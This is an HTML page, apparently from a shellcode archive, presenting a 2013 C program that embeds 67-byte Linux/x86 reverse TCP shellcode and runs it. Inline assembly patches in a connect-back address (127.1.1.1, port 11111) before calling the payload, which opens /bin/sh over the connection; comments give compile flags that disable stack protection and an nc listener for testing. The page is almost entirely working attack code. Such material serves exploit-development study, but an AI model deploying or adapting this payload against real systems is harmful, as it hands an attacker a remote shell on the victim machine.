<html><head><title>Linux/x86 - Tiny Shell Reverse TCP - 67 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*

 Tiny Shell Reverse TCP Shellcode - C Language
 Linux/x86

 Written in 2013 by Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

 This source is licensed under the Creative Commons
 Attribution-ShareAlike 3.0 Brazil License.

 To view a copy of this license, visit

   http://creativecommons.org/licenses/by-sa/3.0/

 You are free:

    to Share - to copy, distribute and transmit the work
    to Remix - to adapt the work
    to make commercial use of the work

 Under the following conditions:
   Attribution - You must attribute the work in the manner
                 specified by the author or licensor (but
                 not in any way that suggests that they
                 endorse you or your use of the work).

   Share Alike - If you alter, transform, or build upon
                 this work, you may distribute the
                 resulting work only under the same or
                 similar license to this one.

*/

/*

 tiny_shell_reverse_tcp_shellcode

 * 67 bytes
 * null-free if the IP and port are


 # gcc -m32 -fno-stack-protector -z execstack tiny_shell_reverse_tcp_shellcode.c -o tiny_shell_reverse_tcp_shellcode

 Testing
 # nc -l 127.1.1.1 11111
 # ./tiny_shell_reverse_tcp_shellcode

*/


#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

unsigned char code[] = \

&quot;\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a&quot;
&quot;\x02\x89\xe1\xcd\x80\x59\x93\xb0\x3f\xcd&quot;
&quot;\x80\x49\x79\xf9\xb0\x66\x68\x7f\x01\x01&quot;
&quot;\x01\x66\x68\x2b\x67\x66\x6a\x02\x89\xe1&quot;
&quot;\x6a\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b&quot;
&quot;\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69&quot;
&quot;\x6e\x89\xe3\x31\xc9\xcd\x80&quot;;

main ()
{

        // When the Port contains null bytes, printf will show a wrong shellcode length.

	printf(&quot;Shellcode Length:  %d\n&quot;, strlen(code));

	// Pollutes all registers ensuring that the shellcode runs in any circumstance.

	__asm__ (&quot;movl $0xffffffff, %eax\n\t&quot;
		 &quot;movl %eax, %ebx\n\t&quot;
		 &quot;movl %eax, %ecx\n\t&quot;
		 &quot;movl %eax, %edx\n\t&quot;
		 &quot;movl %eax, %esi\n\t&quot;
		 &quot;movl %eax, %edi\n\t&quot;
		 &quot;movl %eax, %ebp\n\t&quot;

	// Setting the IP
		 &quot;movl $0x0101017f, (code+27)\n\t&quot;

	// Setting the port
		 &quot;movw $0x672b, (code+33)\n\t&quot;

	// Calling the shellcode
		 &quot;call code&quot;);

}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
